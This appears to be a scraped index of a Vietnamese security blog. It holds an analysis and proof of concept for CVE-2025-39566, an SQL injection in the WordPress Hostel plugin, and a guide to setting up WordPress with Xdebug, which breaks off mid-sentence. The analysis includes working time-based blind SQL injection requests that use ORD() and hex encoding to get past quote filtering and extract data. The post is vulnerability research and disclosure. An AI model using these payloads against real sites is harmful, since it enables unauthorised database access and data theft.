\u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 